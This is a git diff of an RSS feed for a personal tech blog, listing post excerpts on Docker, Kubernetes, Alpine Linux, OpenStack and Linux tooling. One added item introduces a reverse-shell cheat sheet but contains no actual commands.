+kernel: image: &amp;#34;mobylinux/kernel:4.9.x&amp;#34; cmdline: &amp;#34;console=ttyS0 console=tty0 page_poison=1&amp;#34; init: - linuxkit/init:42fe8cb1508b3afed39eb89821906e3cc7a70551 - mobylinux/runc:b0fb122e10dbb7e4e45115177a61a3f8d68c19a9 - linuxkit/containerd:60e2486a74c665ba4df57e561729aec20758daed - mobylinux/ca-certificates:eabc5a6e59f05aa91529d80e9a595b85b046f935 onboot: - name: sysctl image: &amp;#34;mobylinux/sysctl:2cf2f9d5b4d314ba1bfc22b2fe931924af666d8c&amp;#34; net: host pid: host ipc: host capabilities: - CAP_SYS_ADMIN readonly: true - name: binfmt image: &amp;#34;linuxkit/binfmt:8881283ac627be1542811bd25c85e7782aebc692&amp;#34; binds: - /proc/sys/fs/binfmt_misc:/binfmt_misc readonly: true - name: dhcpcd image: &amp;#34;linuxkit/dhcpcd:48e249ebef6a521eed886b3bce032db69fbb4afa&amp;#34; binds: - /var:/var - /tmp/etc:/etc capabilities: - CAP_NET_ADMIN - CAP_NET_BIND_SERVICE - CAP_NET_RAW net: host command: [&amp;#34;/sbin/dhcpcd&amp;#34;, &amp;#34;--nobackground&amp;#34;, &amp;#34;-f&amp;#34;, &amp;#34;/dhcpcd.</description>
     </item>
     
     <item>
@@ -501,7 +525,13 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/alpine-linux/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Alpine Linux&amp;rdquo; date: &amp;ldquo;2016-03-26 14:27&amp;rdquo; Alpine Linux 随着Alpine Linux被越来越多的官方镜像使用，我们有必要了解一下Alpine Linux到底是个什么鬼。 Alpine Linux 是一个面</description>
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Alpine Linux&amp;rdquo; date: &amp;ldquo;2016-03-26 14:27&amp;rdquo; Alpine Linux
+随着Alpine Linux被越来越多的官方镜像使用，我们有必要了解一下Alpine Linux到底是个什么鬼。
+Alpine Linux 是一个面向安全应用的轻量级 Linux 发行版。它采用了musl libc和busybox以减小系统的体积和运行时资源消耗，同时还提供了自己的包管理工具apk。Alpine Linux的内核都打了grsecurity/PaX补丁，并且所有的程序都编译为Position Independent Executables (PIE) 以增强系统的安全性。
+Alpine Linux小试 我们可以通过虚拟机来体验一下完整的Alpine Linux。从alpinelinux.org下载iso（当前是v3.3.3版本，大小为78MB），然后就可以通过Virtual Box或者VMWare创建虚拟机了。默认情况下，启动的虚拟机是diskless模式，重启虚拟机会丢掉所有的变更。因而，建议通过setup-alpine来修改安装模式，同时也对系统进行一些配置的初始化。
+Alpine社区提供了Docker包，可以方便的安装Docker：
+echo “http://nl.alpinelinux.org/alpine/v3.3/community” &amp;gt;&amp;gt; /etc/apk/repositories apk update apk add docker rc-update add docker boot service docker start Alpine Docker镜像 Docker官方还维护了一个Alpine Linux镜像，大小只有4.7MB，比起大家常用的Ubuntu要小的多。现在有很多镜像都已经用这个镜像来代替了以前的Ubuntu/Debian了，比如常用的haproxy、nginx等。
+Alpine Linux的官方网站为[http://alpinelinux.org]，从[http://wiki.alpinelinux.org]可以找到更多的使用指南。</description>
     </item>
     
     <item>
@@ -510,8 +540,7 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/docker-datacenter/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Docker Datacenter&amp;rdquo; date: &amp;ldquo;2016-02-26 17:38&amp;rdquo; category: docker
-tags: [docker, cluster] Docker annonced Docker Datacenter (DDC) at Februrary 23. It is an integrated, end-to-end platform for agile application development and management from the datacenter to the cloud.
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Docker Datacenter&amp;rdquo; date: &amp;ldquo;2016-02-26 17:38&amp;rdquo; category: docker tags: [docker, cluster] Docker annonced Docker Datacenter (DDC) at Februrary 23. It is an integrated, end-to-end platform for agile application development and management from the datacenter to the cloud.
 With Docker Datacenter, organizations are empowered to deploy a Containers as a Services (CaaS) on-premises or in your virtual private cloud. A CaaS provides an IT managed and secured application environment of content and infrastructure where developers can build and deploy applications in a self service manner.</description>
     </item>
     
@@ -521,8 +550,7 @@ With Docker Datacenter, organizations are empowered to deploy a Containers as a 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/googles-transition-from-single-datacenter-to-failover-to-a-native-multihomed-architecture/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Google&amp;rsquo;s Transition From Single Datacenter, To Failover, To A Native Multihomed Architecture&amp;rdquo; date: &amp;ldquo;2016-02-24 10:33&amp;rdquo; category: cluster
-tags: [highscalability, google] The main idea of the paper is that the typical failover architecture used when moving from a single datacenter to multiple datacenters doesn’t work well in practice. What does work, where work means using fewer resources while providing high availability and consistency, is a natively multihomed architecture:</description>
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Google&#39;s Transition From Single Datacenter, To Failover, To A Native Multihomed Architecture&amp;rdquo; date: &amp;ldquo;2016-02-24 10:33&amp;rdquo; category: cluster tags: [highscalability, google] The main idea of the paper is that the typical failover architecture used when moving from a single datacenter to multiple datacenters doesn’t work well in practice. What does work, where work means using fewer resources while providing high availability and consistency, is a natively multihomed architecture:</description>
     </item>
     
     <item>
@@ -531,7 +559,9 @@ tags: [highscalability, google] The main idea of the paper is that the typical f
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/hello-world-to-docker-mac/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Hello world to Docker Mac&amp;rdquo; date: &amp;ldquo;2016-04-15 16:34&amp;rdquo; 终于等到了Docker for Mac。如之前期待的，体验真的很棒： 安装简单了，标准的Mac Application VPN无障碍 原生的（osxfs）</description>
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Hello world to Docker Mac&amp;rdquo; date: &amp;ldquo;2016-04-15 16:34&amp;rdquo; 终于等到了Docker for Mac。如之前期待的，体验真的很棒：
+ 安装简单了，标准的Mac Application  VPN无障碍 原生的（osxfs）文件系统共享（其实还支持9p方式） Docker Application管理 xhyve VM，更改配置后会自动重启 速度快，在使用体验上跟在Linux上面已经差别不大 可以与docker toolbox共存：Docker for Mac也会像Linux上面一样监听一个/var/run/docker.sock，这样客户端默认情况下就会走它的API；但也可以通过环境变量告诉docker CLI调用其他Docker Daemon的API（比如docker-machine管理的vm等）  跑一个nginx试试：
+➜ ~ docker version Client: Version: 1.11.0 API version: 1.23 Go version: go1.5.4 Git commit: 4dc5990 Built: Wed Apr 13 19:36:04 2016 OS/Arch: darwin/amd64 Server: Version: 1.11.0 API version: 1.23 Go version: go1.5.4 Git commit: a5315b8 Built: Thu Apr 14 10:19:52 2016 OS/Arch: linux/amd64 ➜ ~ ➜ ~ ls /var/run/docker.</description>
     </item>
     
     <item>
@@ -540,7 +570,11 @@ tags: [highscalability, google] The main idea of the paper is that the typical f
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/kubernetes-drain/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Kubernetes drain&amp;rdquo; date: &amp;ldquo;2016-02-17 18:57&amp;rdquo; Kubernetes v1.2以前，如果想要对某个NODE（也就是Kubelet和Docker所在的机器）进行维护（比如升级Docker或者内核</description>
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Kubernetes drain&amp;rdquo; date: &amp;ldquo;2016-02-17 18:57&amp;rdquo; Kubernetes v1.2以前，如果想要对某个NODE（也就是Kubelet和Docker所在的机器）进行维护（比如升级Docker或者内核等）又不想影响运行中的Pod的话，需要手动做很多的步骤：
+ 首先patch NODE，将其改为不可调度状态： kubectl patch nodes $NODENAME -p &#39;{&amp;quot;spec&amp;quot;: {&amp;quot;unschedulable&amp;quot;: true}}&#39; 然后逐一删掉该NODE上的Pod，由Replication Ctroller自动到其它NODE上创建新的Pod 维护结束后再重新patch NODE，将其改成正常状态  在即将发布的v1.2中，kubectl中增加了drain和uncordon命令，使得这个过程更为简单易用。
+kubectl drain kubectl drain的功能是将NODE改为维护模式，使用方法为
+kubectl drain NODE [Options] 其中，可选的Options为：
+--force[=false]: Continue even if there are pods not managed by a ReplicationController, Job, or DaemonSet. --grace-period=-1: Period of time in seconds given to each pod to terminate gracefully. If negative, the default value specified in the pod will be used.</description>
     </item>
     
     <item>
@@ -549,7 +583,13 @@ tags: [highscalability, google] The main idea of the paper is that the typical f
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/kubernetes-network-policy/</guid>
-      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Kubernetes network policy&amp;rdquo; date: &amp;ldquo;2016-02-17 18:53&amp;rdquo; Kubernetes network policy Kubernetes社区（确切的说是Kubernetes Network SIG [1]）正在讨论Network Policy Proposal，以实现</description>
+      <description>layout: &amp;ldquo;post&amp;rdquo; title: &amp;ldquo;Kubernetes network policy&amp;rdquo; date: &amp;ldquo;2016-02-17 18:53&amp;rdquo; Kubernetes network policy
+Kubernetes社区（确切的说是Kubernetes Network SIG [1]）正在讨论Network Policy Proposal，以实现SDN、网络隔离、IP Overlapping等[2]复杂的网络需求。
+目前，正在讨论的Proposals有多个：
+ Consolidated Casey/RH Proposal https://docs.google.com/document/d/1blfqiH4L_fpn33ZrnQ11v7LcYP0lmpiJ_RaapAPBbNU/edit Casey Davenport https://docs.google.com/document/d/16fg7Dc7K5m4bM2vGwyvkhPG_lcBKeOjaUSYBMwZlR_o/edit?usp=sharing Vipin Jain https://docs.google.com/a/insiemenetworks.com/document/d/1KKMOJSXKKQOzlblAzwYV72KGUlAuAaUuFqCWO8h4gd0/edit?usp=sharing Tim Hockin https://docs.google.com/document/d/1bXUO-Lp6smmLm7SMGwrwuvK23wgsaWvx6Mkt-Y0AtZ0/edit#  这几个Proposal都大同小异，主要的思想都是一致的：
+ 默认情况下网络模型跟现在保持一致，只有定义了Network Policy并且实现了相应的Network Plugin的时候，这个Proposal才有意义 Network Policy: 管理网络连通性策略，这些策略与具体的网络实现（如libnetwork等）无关 Network Policy通过Label作用到Pod/Service上 需要Network Plugin配合实现Network Policy  下面就以Consolidated Casey/RH Proposal为例看看具体的Proposal都有啥。
+设计目标  不影响现有的网络架构，即未定义Network Policy时，保持Kubernetes现有的网络架构 基于ThirdPartyResource实现NetworkPolicy资源的管理  Namespaces Namespace spec中增加isolation，默认关闭。当isolation打开后
+ 所有访问该Namespace内部Pods的请求都被拒绝(也包括该Namespace内部的Pods访问内部的其他Pods） 例外：为了不影响Health Check，从Node上访问Pods均允许  apiVersion: v1 kind: Namespace metadata: name: IsolatedApp spec: isolation: [ yes | no ] NetworkPolicy Objects 当Namespace的isolation打开的时候，需要NetworkPolicy来控制访问策略。访问策略的规则为：</description>
     </item>
     
     <item>
@@ -559,6 +599,44 @@ tags: [highscalability, google] The main idea of the paper is that the typical f
       
       <guid>https://feisky.xyz/posts/2015-02-06-apachemesosgooglekubernetes-/</guid>
       <description>Kubernetes是一个开源项目，它把谷歌的集群管理工具引入到虚拟机和裸机场景中。它可以完美运行在现代的操作系统环境（比如CoreOS和R</description>
+    </item>
+    
+    <item>
+      <title>awesome quick start</title>
+      <link>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</guid>
+      <description>awesome是Linux平台出色的窗口管理器，具有速度快、界面简捷等优点。其安装也比较简单： sudo apt-get install -y awesome awesome-extra gnome-settings-daemon nautilus sudo apt-get install -y --no-install-recommends gnome-session mkdir -p ~/.config/awesome 常用快捷键整</description>
+    </item>
+    
+    <item>
+      <title>awk examples</title>
+      <link>https://feisky.xyz/posts/2015-01-28-awk-examples/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-01-28-awk-examples/</guid>
+      <description>precede each line by line number  awk &amp;#39;{print NR, $0}&amp;#39; filename  replace first field by line number  awk &amp;#39;{$1=NR; print}&amp;#39; filename  print field 1 and field 2  awk &amp;#39;{print $1,$2}&amp;#39; fielname  print last field  awk &amp;#39;{print $NF}&amp;#39; filename  print non empty lines  awk &amp;#39;NF&amp;gt;0{print $0}&amp;#39; filename  print if more than 4 fields  awk &amp;#39;NF&amp;gt;4{print $0}&amp;#39; filename  print matching lines (egrep)  awk &amp;#39;/test.</description>
+    </item>
+    
+    <item>
+      <title>bigdata</title>
+      <link>https://feisky.xyz/posts/2015-01-27-bigdata/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-01-27-bigdata/</guid>
+      <description>Awesome Big Data A curated list of awesome big data frameworks, resources and other awesomeness. Inspired by awesome-php, awesome-python, awesome-ruby, hadoopecosystemtable &amp;amp; big-data.
+Your contributions are always welcome!
+ Awesome Big Data  Frameworks Distributed Programming Distributed Filesystem Key-Map Data Model Document Data Model Key-value Data Model Graph Data Model NewSQL Databases Columnar Databases Time-Series Databases SQL-like processing Integrated Development Environments Data Ingestion Service Programming Scheduling Machine Learning Benchmarking Security System Deployment Applications Search engine and framework MySQL forks and evolutions PostgreSQL forks and evolutions Memcached forks and evolutions Embedded Databases Business Intelligence Data Visualization Internet of things and sensor data Interesting Readings Interesting Papers   Other Awesome Lists  Frameworks  Apache Hadoop - framework for distributed processing.</description>
+    </item>
+    
+    <item>
+      <title>cannot change locale</title>
+      <link>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</guid>
+      <description>运行locale命令LANG= LANGUAGE= LC_CTYPE=&amp;quot;POSIX&amp;rdquo; LC_NUMERIC=&amp;quot;POSIX&amp;rdquo; LC_TIME=&amp;quot;POSIX&amp;rdquo; LC_COLLATE=&amp;quot;POSIX&amp;rdquo; LC_MONETARY=&amp;quot;POSIX&amp;rdquo; LC_MESSAGES=&amp;quot;POSIX&amp;rdquo; LC_PAPER=&amp;quot;POSIX&amp;rdquo; LC_NAME=&amp;quot;POSIX&amp;rdquo; LC_ADDRESS=&amp;quot;POSIX&amp;rdquo; LC_TELEPHONE=&amp;quot;POSIX&amp;rdquo; LC_MEASUREMENT=&amp;quot;POSIX&amp;rdquo; LC_IDENTIFICATION=&amp;quot;POSIX&amp;rdquo; LC_ALL= 修改profile vi /etc/profile 添加如下内容 export LC_ALL=en_US.UTF-8 source /etc/profile 得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory 运行 dpkg-reconfigure locales 得</description>
     </item>
     
     <item>
@@ -595,8 +673,35 @@ This will startup 4 containers:</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2015-03-05-docker-acquires-sdn-startup-socketplane/</guid>
-      <description>At Socketplane we started out as four guys with a collectively strong belief in open source and open communities. &amp;nbsp;We aligned around a shared vision that we wanted to be a critical part of Docker’s once in a decade disruption. Now that we are part of the Docker team, we couldn’t be happier.
+      <description>At Socketplane we started out as four guys with a collectively strong belief in open source and open communities. We aligned around a shared vision that we wanted to be a critical part of Docker’s once in a decade disruption. Now that we are part of the Docker team, we couldn’t be happier.
 We never looked to hedge our bets, our success was and obviously still is tied to the success of Docker.</description>
+    </item>
+    
+    <item>
+      <title>docker in tencent</title>
+      <link>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</guid>
+      <description>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并</description>
+    </item>
+    
+    <item>
+      <title>docker internal</title>
+      <link>https://feisky.xyz/posts/2015-01-27-docker-internal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-01-27-docker-internal/</guid>
+      <description>docker-baseAbstractA subsystem is a module that makes use of the task grouping facilities provided by cgroups to treat groups of tasks in particular ways. A subsystem is typically a &amp;ldquo;resource controller&amp;rdquo; that schedules a resource or applies per-cgroup limits, but it may be anything that wants to act on a group of processes, e.g. a virtualization subsystem. &amp;ldquo;docker diff&amp;rdquo; is implemented by just scanning the container filesystem and the parent</description>
+    </item>
+    
+    <item>
+      <title>git commit修改前一次提交的方法</title>
+      <link>https://feisky.xyz/posts/2015-06-05-git-commit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-06-05-git-commit/</guid>
+      <description>方法一：用–amend选项 #修改需要修改的地方。 git add . git commit –amend 注：这种方式可以比较方便的保持原有的Change-Id，推荐使用。 方法</description>
     </item>
     
     <item>
@@ -615,9 +720,10 @@ We never looked to hedge our bets, our success was and obviously still is tied t
       
       <guid>https://feisky.xyz/posts/2015-01-20-hello-world/</guid>
       <description>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick Start Create a new post $ hexo new &amp;quot;My New Post&amp;quot;  More info: Writing
-Run server $ hexo server  More info: Server
-Generate static files $ hexo generate  More info: Generating</description>
+Quick Start Create a new post $ hexo new &amp;#34;My New Post&amp;#34; More info: Writing
+Run server $ hexo server More info: Server
+Generate static files $ hexo generate More info: Generating
+Deploy to remote sites $ hexo deploy More info: Deployment</description>
     </item>
     
     <item>
@@ -647,19 +753,20 @@ echo manual | sudo tee /etc/init/SERVICE.override  where the stanza manual will 
       <guid>https://feisky.xyz/posts/2015-02-12-how-to-use-docker-compose-to-deploy-a-flask-app/</guid>
       <description>The flask app is very simple, you have an index page where your can write and read comments.
 To start So what we need ?
-In my case a Digital Ocean droplet (I&amp;rsquo;m using Fedora 21).
+In my case a Digital Ocean droplet (I&#39;m using Fedora 21).
 So, first of all we connect to our vm with ssh.
-$ ssh root@yourvmip  Now that we are inside we need to install git, Docker and docker-compose.
-$ yum -y install git docker python-pip $ pip install docker-compose==1.</description>
+Now that we are inside we need to install git, Docker and docker-compose.
+That&#39;s all we need to play with Docker.
+This is our directory tree of our project, quietly standard as you can see.</description>
     </item>
     
     <item>
       <title>Hypernetes   The multi tenant Kubernetes distribution</title>
-      <link>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</link>
+      <link>https://feisky.xyz/posts/2015-11-04-hypernetes-the-multi-tenant-kubernetes-distribution/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</guid>
-      <description>&amp;ldquo;The Caas Revolution&amp;rdquo;. This is what we believe is happening today in the Cloud ecosystem. This revolution has been started by the now famous project (and company) Docker, and embraced by Cloud providers like Google and AWS.
+      <guid>https://feisky.xyz/posts/2015-11-04-hypernetes-the-multi-tenant-kubernetes-distribution/</guid>
+      <description>&amp;ldquo;The Caas Revolution&amp;quot;. This is what we believe is happening today in the Cloud ecosystem. This revolution has been started by the now famous project (and company) Docker, and embraced by Cloud providers like Google and AWS.
 However, most multi-tenant CaaS solutions today run on a public IaaS, and use fully isolated virtual machine clusters to schedule containers. This is in contrast to the solely container-based implementation provided in private CaaS deployments.</description>
     </item>
     
@@ -673,6 +780,17 @@ However, most multi-tenant CaaS solutions today run on a public IaaS, and use fu
     </item>
     
     <item>
+      <title>Installing nova docker on OpenStack Juno</title>
+      <link>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</guid>
+      <description>This post comes about indirectly by a request on IRC in #rdo for help getting nova-docker installed on Fedora 21. I ran through the process from start to finish and decided to write everything down for posterity.
+Getting started I started with the Fedora 21 Cloud Image, because I&#39;m installing onto OpenStack and the cloud images include some features that are useful in this environment.
+We&#39;ll be using OpenStack packages from the RDO Juno repository.</description>
+    </item>
+    
+    <item>
       <title>Installing Realtek rltwifi driver for Ubuntu 14.10</title>
       <link>https://feisky.xyz/posts/2015-02-15-installing-realtek-rltwifi-driver-for-ubuntu-1410/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -682,24 +800,13 @@ However, most multi-tenant CaaS solutions today run on a public IaaS, and use fu
     </item>
     
     <item>
-      <title>Installing nova docker on OpenStack Juno</title>
-      <link>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</guid>
-      <description>This post comes about indirectly by a request on IRC in #rdo for help getting nova-docker installed on Fedora 21. I ran through the process from start to finish and decided to write everything down for posterity.
-Getting started I started with the Fedora 21 Cloud Image, because I&amp;rsquo;m installing onto OpenStack and the cloud images include some features that are useful in this environment.
-We&amp;rsquo;ll be using OpenStack packages from the RDO Juno repository.</description>
-    </item>
-    
-    <item>
       <title>Integrating Openstack and Kubernetes with Murano</title>
       <link>https://feisky.xyz/posts/2015-02-26-integrating-openstack-and-kubernetes-with-murano/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2015-02-26-integrating-openstack-and-kubernetes-with-murano/</guid>
       <description>There’s a perceived competition between OpenStack and containers such as Docker, but in reality, the two technologies are a powerful combination. They both solve similar problems, but on different layers of the stack, so combining the two can give users more scalability and automation than ever before.
-That containers app you wrote needs to run somewhere. This is particularly true for orchestrated container applications, such as those managed by Kubernetes.</description>
+That containers app you wrote needs to run somewhere. This is particularly true for orchestrated container applications, such as those managed by Kubernetes. What’s more, if your application is complicated enough that it needs to scale up and down, you need to be running it in an environment that can, itself, scale up and down.</description>
     </item>
     
     <item>
@@ -728,7 +835,7 @@ That containers app you wrote needs to run somewhere. This is particularly true 
       <guid>https://feisky.xyz/posts/2015-03-17-microservice-infrastructure/</guid>
       <description>Microservices Infrastructure Modern platform for rapidly deploying globally distributed services provided by cisco.
 https://github.com/CiscoCloud/microservices-infrastructure
-Features  the ability to deploy applications utilizing resources across multiple datacenters (and even clouds), deploying in a decentralized control model, supporting intelligent endpoints, heavy automation, and the on-demand nature of deploying these services to support business requirements and scale.  Architectural Overview  Mesos cluster manager for efficient resource isolation and sharing across distributed services Marathon for cluster management of long running containerized services Consul for service discovery (By using Consul&amp;rsquo;s inbuilt DNS server) Docker container runtime supported by Marathon Multi-datacenter support High availablity  Single Data Center Architecture The base platform contains control nodes that manage the cluster and any number of compute nodes.</description>
+Features  the ability to deploy applications utilizing resources across multiple datacenters (and even clouds), deploying in a decentralized control model, supporting intelligent endpoints, heavy automation, and the on-demand nature of deploying these services to support business requirements and scale.  Architectural Overview  Mesos cluster manager for efficient resource isolation and sharing across distributed services Marathon for cluster management of long running containerized services Consul for service discovery (By using Consul&#39;s inbuilt DNS server) Docker container runtime supported by Marathon Multi-datacenter support High availablity  Single Data Center Architecture The base platform contains control nodes that manage the cluster and any number of compute nodes.</description>
     </item>
     
     <item>
@@ -754,15 +861,6 @@ A good ryu blog: http://linton.tw/</description>
     </item>
     
     <item>
-      <title>OVS 2.0 call flow</title>
-      <link>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</guid>
-      <description>Refer http://blog.csdn.net/night_elf_1020/article/details/37600791</description>
-    </item>
-    
-    <item>
       <title>Open vSwitch over DPDK on Ubuntu</title>
       <link>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -777,9 +875,16 @@ A good ryu blog: http://linton.tw/</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</guid>
-      <description>Add network management for native docker https://blueprints.launchpad.net/magnum/+spec/native-docker-network
-https://etherpad.openstack.org/p/magnum-native-docker-network
-From http://dockone.io/article/445</description>
+      <description>Add network management for native docker https://blueprints.launchpad.net/magnum/+spec/native-docker-network https://etherpad.openstack.org/p/magnum-native-docker-network From http://dockone.io/article/445</description>
+    </item>
+    
+    <item>
+      <title>OVS 2.0 call flow</title>
+      <link>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</guid>
+      <description>Refer http://blog.csdn.net/night_elf_1020/article/details/37600791</description>
     </item>
     
     <item>
@@ -807,7 +912,7 @@ The only requirement is to have a virtual machine running the qemu-guest-agent.<
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2015-02-11-ios-blog-resources/</guid>
-      <description>索引 ANDROID ANGULAR BOOTSTRAP C# C/C++ CASSANDRA CHROME CLOJURE COUCHDB D DAPPER DEVOPS DOCKER ERLANG FIREFOX GIT GO HADOOP HASKELL HTML5 IOS JAVA JAVASCRIPT LINUX LISP LUA MARKDOWN MATH MEMCACHED MONGODB MYSQL NGINX NODE.JS OPENGL OPENSTACK PERL PHP POSTGRESQL PUPPET PYTHON R RASPBERRY PI REDIS REGEX RUBY RUST SCALA SHELL SPARK STORM SWIFT VARNISH VIM WEB前端 WEB安全 WOLFRAM 开源系</description>
+      <description>索引 ANDROID ANGULAR BOOTSTRAP C# C/C++ CASSANDRA CHROME CLOJURE COUCHDB D DAPPER DEVOPS DOCKER ERLANG FIREFOX GIT GO HADOOP HASKELL HTML5 IOS JAVA JAVASCRIPT LINUX LISP LUA MARKDOWN MATH MEMCACHED MONGODB MYSQL NGINX NODE.JS OPENGL OPENSTACK PERL PHP POSTGRESQL PUPPET PYTHON R [RASPBERRY PI](#RASPBERRY PI) REDIS REGEX RUBY RUST SCALA SHELL SPARK STORM SWIFT VARNISH VIM WEB前端 WEB安全 WOLFRAM 开源</description>
     </item>
     
     <item>
@@ -816,7 +921,7 @@ The only requirement is to have a virtual machine running the qemu-guest-agent.<
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2015-03-05-python-not-defined-problem/</guid>
-      <description>file仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法： import os import inspect import sys if not hasattr(sys.modules[__name__], &#39;__file__&#39;): __file__ = inspect.getfile(inspect.currentframe()) print os.path.dirname(os.path.abspath(__file__))</description>
+      <description>__file__仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法： import os import inspect import sys if not hasattr(sys.modules[__name__], &#39;__file__&#39;): __file__ = inspect.getfile(inspect.currentframe()) print os.path.dirname(os.path.abspath(__file__))</description>
     </item>
     
     <item>
@@ -828,6 +933,19 @@ The only requirement is to have a virtual machine running the qemu-guest-agent.<
       <description>Introduction Red Hat has announced first public beta of Red Hat Enterprise Linux 7 Atomic Host. The beta is available from Red Hat and on Amazon Web Services and Google Compute Platform.
 What can you expect from the Red Hat Enterprise Linux 7 Atomic Host Beta?
 Specifically Designed to Run Containers Red Hat Enterprise Linux 7 Atomic Host Beta provides a streamlined host platform that is optimized to run application containers.</description>
+    </item>
+    
+    <item>
+      <title>reverse shell</title>
+      <link>https://feisky.xyz/posts/2015-01-28-reverse-shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-01-28-reverse-shell/</guid>
+      <description>Listen for 8080 first Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+There’s also an alternative PERL revere shell here.
+Python This was tested under Linux / Python 2.7:
+PHP This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…</description>
     </item>
     
     <item>
@@ -846,8 +964,8 @@ Specifically Designed to Run Containers Red Hat Enterprise Linux 7 Atomic Host B
       
       <guid>https://feisky.xyz/posts/2015-09-23-something-about-kubernetes-authentication/</guid>
       <description>You can enable kubernetes authentication by through this documentation. Then you happily access kube-apiserve by curl:
